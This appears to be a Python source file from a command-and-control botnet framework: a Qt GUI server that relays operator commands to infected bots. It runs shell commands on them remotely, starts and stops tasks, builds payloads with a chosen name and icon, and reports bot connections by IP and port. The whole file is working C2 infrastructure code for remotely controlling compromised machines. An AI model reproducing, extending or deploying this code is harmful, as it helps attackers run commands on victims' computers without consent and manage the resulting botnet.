from qtpy.QtCore import Signal, Slot

import socket

from models.Bot import Bot
from models import Task, Info
from models.Device import Device
from core.crypto import generate_key
from core.Network.SecureServer import SecureThreadedServer


class GUIServer(SecureThreadedServer):
    """GUI server."""
    stop_task = Signal(int, int)
    force_start_task = Signal(int, int)
    start_task = Signal(int, str, dict, int)
    get_tasks = Signal(Device)

    build_start = Signal(Device, str, str, list)
    build_stop = Signal(Device)
    build_options = Signal(Device)

    get_config = Signal(Device)
    save_config = Signal(Device, dict)

    restart_app = Signal()
    close_app = Signal()

    setup_options = Signal(Device)

    run_shell = Signal(int, str)

    def __init__(self, require_verification=False):
        super(GUIServer, self).__init__(require_verification)
        self.set_device_model(Device)

    @Slot()
    def start_setup(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("google.com", 80))
        ip = s.getsockname()[0]
        with socket.socket() as s:
            s.bind(('', 0))
            port = s.getsockname()[1]
        key = generate_key()
        return ip, port, key

    @Slot(Device, bytes)
    def on_message(self, device: Device, message: bytes):
        message = super().on_message(device, message)
        event_type = message.get("event_type")
        event = message.get("event")

        if event_type == "task":
            if event == "options":
                self.get_tasks.emit(device)

            elif event == "stop":
                self.stop_task.emit(message.get("bot_id"), message.get("task_id"))

            elif event == "start":
                self.start_task.emit(message.get("bot_id"), message.get("task"),
                                     message.get("kwargs"), message.get("user_activity"))
            elif event == "force_start":
                self.force_start_task.emit(message.get("bot_id"), message.get("task_id"))

        elif event_type == "build":
            if event == "start":
                self.build_start.emit(device, message.get("name"), message.get("icon"), message.get("generators"))
            elif event == "options":
                self.build_options.emit(device)
            elif event == "stop":
                self.build_stop.emit(device)

        elif event_type == "config":
            if event == "get":
                self.get_config.emit(device)
            elif event == "save":
                self.save_config.emit(device, message.get("config"))

        elif event_type == "app":
            if event == "restart":
                self.restart_app.emit()
            elif event == "close":
                self.close_app.emit()

        elif event_type == "setup":
            if event == "options":
                self.setup_options.emit(device)

        elif event_type == "shell":
            if event == "run":
                self.run_shell.emit(message.get("bot_id"), message.get("command"))

    # config
    @Slot(Device, dict)
    def on_setup_options(self, device, options):
        self.write(device, {"event_type": "setup",
                            "event": "options",
                            "options": options})

    @Slot(Device)
    def on_connected_no_config(self, device):
        self.write(device, {"event_type": "app",
                            "event": "setup"})

    @Slot(Device, str)
    def on_config_error(self, device, error):
        self.write(device, {"event_type": "config",
                            "event": "error",
                            "error": error})

    @Slot(Device)
    def on_config_saved(self, device):
        self.write(device, {"event_type": "config",
                            "event": "saved"})

    @Slot(Device, dict)
    def on_config_get(self, device, config):
        self.write(device, {"event_type": "config",
                            "event": "get",
                            "config": config})

    @Slot(Device, str)
    def on_config_validation_error(self, device, error):
        self.write(device, {"event_type": "config",
                            "event": "validate_error",
                            "error": error})

    @Slot(Device, list)
    def on_get_tasks(self, device, tasks):
        self.write(device, {"event_type": "task",
                            "event": "options",
                            "options": {"tasks": tasks}})

    # building payload
    @Slot(Device, str, str)
    def on_generator_progress(self, device, generator_name, progress):
        self.write(device, {"event_type": "build",
                            "event": "progress",
                            "generator_name": generator_name,
                            "progress": progress})

    @Slot(Device, str)
    def on_generator_started(self, device, generator_name):
        self.write(device, {"event_type": "build",
                            "event": "started",
                            "generator_name": generator_name})

    @Slot(Device, str, int)
    def on_generator_finished(self, device, generator_name, exit_code):
        self.write(device, {"event_type": "build",
                            "event": "generator_finished",
                            "generator_name": generator_name,
                            "exit_code": exit_code})

    @Slot(Device, dict)
    def on_build_options(self, device, options):
        self.write(device, {"event_type": "build",
                            "event": "options",
                            "options": options})

    @Slot(Device)
    def on_build_finished(self, device):
        self.write(device, {"event_type": "build",
                            "event": "build_finished"})

    @Slot(Device)
    def on_build_stopped(self, device):
        self.write(device, {"event_type": "build",
                            "event": "stopped"})

    @Slot(Device, str)
    def on_build_error(self, device, error):
        self.write(device, {"event_type": "build",
                            "event": "error",
                            "error": error})

    # shell
    @Slot(Bot, str)
    def on_shell_error(self, bot, error):
        self.write_all({"event_type": "shell",
                        "event": "error",
                        "bot_id": bot.id(),
                        "error": error})

    @Slot(Bot, str)
    def on_shell_output(self, bot, output):
        self.write_all({"event_type": "shell",
                        "event": "output",
                        "bot_id": bot.id(),
                        "output": output})

    # C2 connections
    @Slot(Bot, str, int)
    def on_bot_connected(self, bot, ip, port):
        self.write_all({"event_type": "connection",
                        "event": "connected",
                        "bot_id": bot.id(),
                        "ip": ip,
                        "port": port})

    @Slot(Bot)
    def on_bot_disconnected(self, bot):
        self.write_all({"event_type": "connection",
                        "event": "disconnected",
                        "bot_id": bot.id()})

    # tasks / info
    @Slot(Task)
    def on_bot_task(self, task):
        self.write_all(task.serialize())

    @Slot(Info)
    def on_bot_info(self, info):
        self.write_all(info.serialize())

    @Slot(str)
    def on_log_signal(self, log: str):
        self.write_all({"event_type": "app",
                        "event": "log",
                        "log": log})
